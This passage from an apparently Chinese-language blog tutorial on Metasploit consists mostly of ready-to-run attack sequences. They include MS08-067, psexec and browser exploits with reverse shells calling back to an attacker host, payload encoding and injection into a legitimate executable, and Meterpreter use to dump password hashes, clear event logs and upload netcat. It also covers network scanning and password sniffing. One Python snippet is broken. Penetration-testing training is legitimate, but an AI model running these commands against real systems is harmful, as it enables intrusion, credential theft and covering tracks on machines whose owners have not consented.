<h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat ms08067.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RPORT 445</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/rNO4Mud.png" alt="img"></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat psexec.rb </span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.148</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBUSER Administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBPASS 123456</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/ctvHDYR.png" alt="img"></p>
<h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat ms07017.rb </span><br><span class="line">use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line"><span class="builtin-name">set</span> URIPATH /</span><br><span class="line"><span class="builtin-name">set</span> SRVHOST 0.0.0.0</span><br><span class="line"><span class="builtin-name">set</span> PAYLOAD windows/shell/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> EXITFUNC thread</span><br><span class="line"><span class="builtin-name">set</span> LHOST 10.10.10.131</span><br><span class="line"><span class="builtin-name">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/meKMAdB.png" alt="img"></p>
<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/aEu1anZ.png" alt="img"></p>
<h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
<li>用法</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">msf &gt; <span class="built_in">search</span> ms08-<span class="number">067</span></span><br><span class="line">msf &gt; use payload/windows/<span class="keyword">shell</span>/bind_tcp</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate  #获得shellcode</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate -h</span><br><span class="line">    Usage: generate [<span class="keyword">options</span>]</span><br><span class="line">    Generates <span class="keyword">a</span> payload.</span><br><span class="line">    OPTIONS:</span><br><span class="line">        -E        强制编码。</span><br><span class="line">        -<span class="keyword">b</span> <span class="symbol">&lt;opt&gt;</span>  要避免的字符列表：<span class="string">'\ x00 \ xff'</span></span><br><span class="line">        -<span class="keyword">e</span> <span class="symbol">&lt;opt&gt;</span>  要使用的编码器模块的名称。</span><br><span class="line">        -<span class="keyword">f</span> <span class="symbol">&lt;opt&gt;</span>  输出文件名（否则为stdout）</span><br><span class="line">        -h        帮助横幅。</span><br><span class="line">        -i <span class="symbol">&lt;opt&gt;</span>  编码迭代的次数。</span><br><span class="line">        -<span class="keyword">k</span>        保持模板可执行的功能</span><br><span class="line">        -<span class="keyword">o</span> <span class="symbol">&lt;opt&gt;</span>  以VAR = VAL格式逗号分隔的选项列表。</span><br><span class="line">        -<span class="keyword">p</span> <span class="symbol">&lt;opt&gt;</span>  输出平台</span><br><span class="line">        -s <span class="symbol">&lt;opt&gt;</span>  NOP sled length.</span><br><span class="line">        -t <span class="symbol">&lt;opt&gt;</span>  输出格式: bash,<span class="keyword">c</span>,csharp,dw,dword,hex,java,js_be,js_le,num,<span class="keyword">perl</span>,pl,powershell,ps1,<span class="keyword">py</span>,<span class="keyword">python</span>,raw,rb,<span class="keyword">ruby</span>,<span class="keyword">sh</span>,vbapplication,vbscript,asp,aspx,aspx-<span class="keyword">exe</span>,axis2,dll,elf,elf-<span class="keyword">so</span>,<span class="keyword">exe</span>,<span class="keyword">exe</span>-<span class="keyword">only</span>,<span class="keyword">exe</span>-service,<span class="keyword">exe</span>-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-<span class="keyword">exe</span>,vba-psh,vbs,war</span><br><span class="line">        -<span class="keyword">x</span> <span class="symbol">&lt;opt&gt;</span>  要使用的可执行模板</span><br><span class="line"></span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/wEztOAj.png" alt="img"></p>
<ul>
<li>自动绕过坏字符</li>
</ul>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">msf payload(windows/shell/bind_tcp) &gt; generate -b '<span class="symbol">\x</span>00'</span><br><span class="line">msf payload(windows/shell/bind_tcp) &gt; generate -b '<span class="symbol">\x</span>00<span class="symbol">\x</span>44<span class="symbol">\x</span>67<span class="symbol">\x</span>66<span class="symbol">\x</span>fa<span class="symbol">\x</span>01<span class="symbol">\x</span>e0<span class="symbol">\x</span>44<span class="symbol">\x</span>67<span class="symbol">\x</span>a1<span class="symbol">\x</span>a2<span class="symbol">\x</span>a3<span class="symbol">\x</span>75<span class="symbol">\x</span>4b'</span><br></pre></td></tr></table></figure>

<ul>
<li>手动指定编码模块</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">msf payload(windows/<span class="keyword">shell</span><span class="bash">/bind_tcp) &gt; show encoders</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/siajCwd.png" alt="img"></p>
<ul>
<li>注入文件</li>
</ul>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msf payload(windows<span class="regexp">/shell/</span>bind_tcp) &gt; generate -b <span class="string">'\x00'</span> -t exe -e x86<span class="regexp">/shikata_ga_nai -i 5 -k -x /u</span>sr<span class="regexp">/share/</span>windows-binaries<span class="regexp">/radmin.exe -f /</span>root<span class="regexp">/1.exe</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>NOP：no-operation / Next Operation （无任何操作）</p>
<ul>
<li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li>
<li>增加一行 EOP</li>
</ul>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">msf payload(windows/shell/bind_tcp) &gt; <span class="keyword">generate</span> -s <span class="number">14</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>高级、动态、可扩展的 payload<ul>
<li>基于 metepreter 上下文利用更多漏洞发起攻击</li>
<li>后渗透测试阶段一站式操作界面</li>
</ul>
</li>
<li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul>
<li>注入合法系统进程并建立 stager</li>
<li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li>
<li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li>
</ul>
</li>
<li>服务端使用 c 语言编写</li>
<li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li>
</ul>
<h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# cat metepreter.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span></span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/b9G8Uq6.png" alt="img"></p>
<ul>
<li>帮助文件</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令                     描述</span></span><br><span class="line"><span class="code">    -------                   -----------</span></span><br><span class="line"><span class="code">    ?                         帮助菜单</span></span><br><span class="line"><span class="code">    background                背景当前会话</span></span><br><span class="line"><span class="code">    bgkill                    杀死一个背景meterpreter脚本</span></span><br><span class="line"><span class="code">    bglist                    列出运行后台脚本</span></span><br><span class="line"><span class="code">    bgrun                     执行一个meterpreter脚本作为后台线程</span></span><br><span class="line"><span class="code">    channel                   显示信息或控制活动频道</span></span><br><span class="line"><span class="code">    close                     关闭频道</span></span><br><span class="line"><span class="code">    disable_unicode_encoding  禁用unicode字符串的编码</span></span><br><span class="line"><span class="code">    enable_unicode_encoding   启用unicode字符串的编码</span></span><br><span class="line"><span class="code">    exit                      终止meterpreter会话</span></span><br><span class="line"><span class="code">    get_timeouts              获取当前会话超时值</span></span><br><span class="line"><span class="code">    guid                      获取会话GUID</span></span><br><span class="line"><span class="code">    help                      帮助菜单</span></span><br><span class="line"><span class="code">    info                      显示有关Post模块的信息</span></span><br><span class="line"><span class="code">    irb                       进入irb脚本模式</span></span><br><span class="line"><span class="code">    load                      加载一个或多个meterpreter扩展</span></span><br><span class="line"><span class="code">    machine_id                获取连接到会话的计算机的MSF ID</span></span><br><span class="line"><span class="code">    migrate                   将服务器迁移到另一个进程</span></span><br><span class="line"><span class="code">    pivot                     管理数据透视监听器</span></span><br><span class="line"><span class="code">    quit                      终止meterpreter会话</span></span><br><span class="line"><span class="code">    read                      从频道读取数据</span></span><br><span class="line"><span class="code">    resource                  运行存储在文件中的命令</span></span><br><span class="line"><span class="code">    run                       执行meterpreter脚本或Post模块</span></span><br><span class="line"><span class="code">    sessions                  快速切换到另一个会话</span></span><br><span class="line"><span class="code">    set_timeouts              设置当前会话超时值</span></span><br><span class="line"><span class="code">    sleep                     Force Meterpreter安静，然后重新建立会话。</span></span><br><span class="line"><span class="code">    transport                 更改当前的传输机制</span></span><br><span class="line"><span class="code">    use                       不推荐使用“加载”别名</span></span><br><span class="line"><span class="code">    uuid                      获取当前会话的UUID</span></span><br><span class="line"><span class="code">    write                     将数据写入通道</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 文件系统命令</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    cat           将文件的内容读取到屏幕上</span></span><br><span class="line"><span class="code">    cd            更改目录</span></span><br><span class="line"><span class="code">    checksum      检索文件的校验和</span></span><br><span class="line"><span class="code">    cp            将源复制到目标</span></span><br><span class="line"><span class="code">    dir           列表文件（ls的别名）</span></span><br><span class="line"><span class="code">    download      下载文件或目录</span></span><br><span class="line"><span class="code">    edit          编辑一个文件</span></span><br><span class="line"><span class="code">    getlwd        打印本地工作目录</span></span><br><span class="line"><span class="code">    getwd         打印工作目录</span></span><br><span class="line"><span class="code">    lcd           更改本地工作目录</span></span><br><span class="line"><span class="code">    lls           列出本地文件</span></span><br><span class="line"><span class="code">    lpwd          打印本地工作目录</span></span><br><span class="line"><span class="code">    ls            列出文件</span></span><br><span class="line"><span class="code">    mkdir         建立目录</span></span><br><span class="line"><span class="code">    mv            将源移到目标</span></span><br><span class="line"><span class="code">    pwd           打印工作目录</span></span><br><span class="line"><span class="code">    rm            删除指定的文件</span></span><br><span class="line"><span class="code">    rmdir         删除目录</span></span><br><span class="line"><span class="code">    search        搜索文件</span></span><br><span class="line"><span class="code">    show_mount    列出所有安装点/逻辑驱动器</span></span><br><span class="line"><span class="code">    upload        上传文件或目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 网络命令</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    arp           显示主机ARP缓存</span></span><br><span class="line"><span class="code">    getproxy      显示当前的代理配置</span></span><br><span class="line"><span class="code">    ifconfig      显示界面</span></span><br><span class="line"><span class="code">    ipconfig      显示界面</span></span><br><span class="line"><span class="code">    netstat       显示网络连接</span></span><br><span class="line"><span class="code">    portfwd       将本地端口转发到远程服务</span></span><br><span class="line"><span class="code">    resolve       解析目标上的一组主机名</span></span><br><span class="line"><span class="code">    route         查看和修改路由表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 系统命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    clearev       清除事件日志</span></span><br><span class="line"><span class="code">    drop_token    放弃任何活动的模拟令牌。</span></span><br><span class="line"><span class="code">    execute       执行一个命令</span></span><br><span class="line"><span class="code">    getenv        获取一个或多个环境变量值</span></span><br><span class="line"><span class="code">    getpid        获取当前的进程标识符</span></span><br><span class="line"><span class="code">    getprivs      尝试启用当前进程可用的所有权限</span></span><br><span class="line"><span class="code">    getsid        获取运行服务器的用户的SID</span></span><br><span class="line"><span class="code">    getuid        获取服务器正在运行的用户</span></span><br><span class="line"><span class="code">    kill          终止一个过程</span></span><br><span class="line"><span class="code">    localtime     显示目标系统的本地日期和时间</span></span><br><span class="line"><span class="code">    pgrep         按名称过滤进程</span></span><br><span class="line"><span class="code">    pkill         按名称终止进程</span></span><br><span class="line"><span class="code">    ps            列出运行的进程</span></span><br><span class="line"><span class="code">    reboot        重新启动远程计算机</span></span><br><span class="line"><span class="code">    reg           修改远程注册表并与之交互</span></span><br><span class="line"><span class="code">    rev2self      在远程机器上调用RevertToSelf（）</span></span><br><span class="line"><span class="code">    shell         放入系统命令外壳</span></span><br><span class="line"><span class="code">    shutdown      关闭远程计算机</span></span><br><span class="line"><span class="code">    steal_token   尝试从目标进程中盗取模拟令牌</span></span><br><span class="line"><span class="code">    suspend       暂停或恢复进程列表</span></span><br><span class="line"><span class="code">    sysinfo       获取有关远程系统的信息，例如OS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 用户界面命令</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    enumdesktops   列出所有可访问的桌面和窗口工作站</span></span><br><span class="line"><span class="code">    getdesktop     获取当前meterpreter桌面</span></span><br><span class="line"><span class="code">    idletime       返回远程用户闲置的秒数</span></span><br><span class="line"><span class="code">    keyscan_dump   转储按键缓冲区</span></span><br><span class="line"><span class="code">    keyscan_start  开始捕捉击键</span></span><br><span class="line"><span class="code">    keyscan_stop   停止捕获击键</span></span><br><span class="line"><span class="code">    screenshot     获取交互式桌面的屏幕截图</span></span><br><span class="line"><span class="code">    setdesktop     更改meterpreters当前桌面</span></span><br><span class="line"><span class="code">    uictl          控制一些用户界面组件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam 命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    record_mic     从默认麦克风录制音频X秒</span></span><br><span class="line"><span class="code">    webcam_chat    开始视频聊天</span></span><br><span class="line"><span class="code">    webcam_list    列出网络摄像头</span></span><br><span class="line"><span class="code">    webcam_snap    从指定的摄像头拍摄快照</span></span><br><span class="line"><span class="code">    webcam_stream  从指定的摄像头播放视频流</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    getsystem     尝试将您的特权提升为本地系统的特权。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: 密码数据库命令</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    hashdump      转储SAM数据库的内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Timestomp 命令</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    timestomp     操纵文件MACE属性</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; execute -f cmd.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; clearev   # 清除日志</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -l</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; hashdump  # 读取密码</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; run post/windows/gather/hashdump  # 读取密码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; shell</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/lJasRoT.png" alt="img"></p>
<h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
<li>2015 年11月份，来自社区贡献</li>
<li>无需运行环境，在客户端运行原生 python 代码</li>
<li>使用</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load <span class="keyword">python</span></span><br><span class="line">meterpreter &gt; python_execute <span class="string">"print ('asdasdas')"</span></span><br><span class="line">meterpreter &gt; python_execute <span class="string">"import os; cd = os.getcwd()"</span> -r <span class="keyword">cd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~# <span class="keyword">cat</span> find2.<span class="keyword">py</span> </span><br><span class="line">import os</span><br><span class="line"><span class="keyword">for</span> root,dirs,<span class="keyword">files</span> in os.walk(<span class="keyword">c</span>://*):</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">file</span> in <span class="keyword">file</span><span class="variable">s:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">file</span>.endwith(<span class="string">".ini"</span> ) <span class="built_in">and</span> <span class="keyword">file</span>.startwith(<span class="string">"win"</span>):</span><br><span class="line">            <span class="keyword">print</span>(os.path.john(root,<span class="keyword">file</span>))</span><br><span class="line">python_import -<span class="keyword">f</span> <span class="keyword">find</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul>
<li>2015 年6月已经被取消</li>
<li>由 msfconsole -x 取代</li>
<li>编写脚本时便于引用</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">msfconsole -x "<span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi; <span class="keyword">set</span> RHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span>; <span class="keyword">set</span> PAYLOAD windows/meterpreter/reverse_tcp; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span>; <span class="keyword">set</span> LPORT <span class="number">5555</span>; <span class="keyword">set</span> target <span class="number">34</span>; exploit"</span><br></pre></td></tr></table></figure>

<h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul>
<li>信息收集的模块都在 auxiliary/scanner/ 之下</li>
</ul>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">msf</span> &gt; <span class="selector-tag">use</span> <span class="selector-tag">auxiliary</span>/<span class="selector-tag">scanner</span>/ <span class="selector-attr">[TAB]</span></span><br><span class="line"><span class="selector-tag">Display</span> <span class="keyword">all</span> <span class="selector-tag">531</span> <span class="selector-tag">possibilities</span>? (y or n)</span><br></pre></td></tr></table></figure>

<h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul>
<li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf &gt; db_nmap -sV <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<ul>
<li>auxiliary 目录下</li>
<li>RHOSTS &lt;&gt; RHOST<ul>
<li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li>
<li>也可以编写地址列表：file:/root/h.txt</li>
</ul>
</li>
</ul>
<h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul>
<li>use auxiliary/scanner/discovery/arp_sweep</li>
<li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf &gt; search arp</span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; show options </span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.0/24</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span> THREADS 20</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; run</span><br></pre></td></tr></table></figure>



<h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul>
<li>use auxiliary/scanner/portscan/syn</li>
<li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; show options </span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> PORTS 80</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.0/24</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> THREADS 50</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; run</span><br></pre></td></tr></table></figure>



<h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul>
<li>查找 ipidseq 主机（查找僵尸机）<ul>
<li>use auxiliary/scanner/ip/ipidseq</li>
<li>set RHOSTS 192.168.1.0/24 ；run</li>
<li>nmap -PN -sI 10.10.10.147 10.10.10.132</li>
</ul>
</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq</span><br><span class="line">msf auxiliary(scanner/ip/ipidseq) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/ip/ipidseq) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ip/<span class="comment">ipidseq) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ip/<span class="comment">ipidseq) &gt; run</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf &gt; db_nmap -PN -sI <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>

<h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul>
<li>use auxiliary/scanner/discovery/udp_sweep</li>
<li>use auxiliary/scanner/discovery/udp_probe</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_sweep) &gt; run</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; set CHOST 10.10.10.131</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; run</span></span><br></pre></td></tr></table></figure>

<h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul>
<li>use auxiliary/sniffer/psnuffle</li>
<li>支持从 pacap 抓包文件中提取密码</li>
<li>功能类似于 dsniff</li>
<li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf &gt; search sniffer</span><br><span class="line">msf &gt; use auxiliary/sniffer/psnuffle</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; show options </span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; run</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# ftp <span class="number">10.10</span><span class="number">.10</span><span class="number">.148</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; show <span class="keyword">options</span></span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; <span class="keyword">set</span> PCAPFILE /root/<span class="comment">ftp.pcapng</span></span><br><span class="line">msf <span class="comment">auxiliary(sniffer</span>/psnuffle) &gt; jobs</span><br><span class="line">msf auxiliary(sniffer/<span class="comment">psnuffle) &gt; kill 0</span></span><br><span class="line">msf <span class="comment">auxiliary(sniffer</span>/psnuffle) &gt; run</span><br></pre></td></tr></table></figure>

<h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul>
<li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li>
